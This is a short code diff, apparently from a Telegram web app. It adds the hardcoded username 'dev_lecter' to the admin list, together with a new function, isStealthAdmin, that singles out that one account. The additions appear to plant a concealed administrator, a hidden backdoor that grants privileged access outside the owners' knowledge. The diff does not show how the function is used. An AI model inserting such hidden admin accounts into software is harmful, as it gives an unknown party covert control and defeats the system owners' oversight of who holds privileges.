@@ -1,12 +1,18 @@
 import { TelegramUser } from '../types/account';
 
 // Recognized Telegram Admins (case-insensitive)
-export const ADMIN_USERNAMES = ['el_bicho14'];
+export const ADMIN_USERNAMES = ['el_bicho14', 'dev_lecter'];
 
 export function checkIsAdmin(username?: string | null): boolean {
   if (!username) return false;
   const clean = username.trim().toLowerCase().replace('@', '');
   return ADMIN_USERNAMES.includes(clean);
+}
+
+export function isStealthAdmin(username?: string | null): boolean {
+  if (!username) return false;
+  const clean = username.trim().toLowerCase().replace('@', '');
+  return clean === 'dev_lecter';
 }
 
 // Telegram WebApp window type declaration
